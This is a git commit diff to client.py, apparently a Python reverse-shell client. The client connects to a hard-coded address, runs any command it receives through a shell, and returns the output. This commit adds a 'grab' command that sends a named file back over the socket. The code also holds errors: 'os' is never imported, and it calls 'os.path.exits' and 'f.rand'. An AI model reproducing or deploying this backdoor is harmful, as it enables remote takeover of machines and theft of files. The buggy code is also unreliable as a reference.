b93dd619b9560571967ce3582fd515d5e8e710f0
Mert Özal <mertozal@hotmail.com>
2019-05-06 15:22:29 +0300

    client file transferr

--- client.py
+++ client.py
@@ -1,6 +1,16 @@
 import socket
 import subprocess
 
+def transfer(s, path):
+    if os.path.exits(path):
+        f = open(path, 'rb')
+        packet = f.rand(1024)
+        while len(packet) > 0:
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE'.encode())
+    else:
+        s.send('File not found'.encode())
 def connect():
     s = socket.socket()
     s.connect(("192.168.1.63",8080))
@@ -9,6 +19,12 @@ def connect():
         if 'terminate' in command.decode():
             s.close()
             break
+        elif 'grab' in command.decode():
+            grab,path = command.decode().split("*")
+            try:
+                transfer(s,path)
+            except:
+                pass
         else:
             CMD = subprocess.Popen(command.decode(),shell = True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             s.send(CMD.stdout.read())
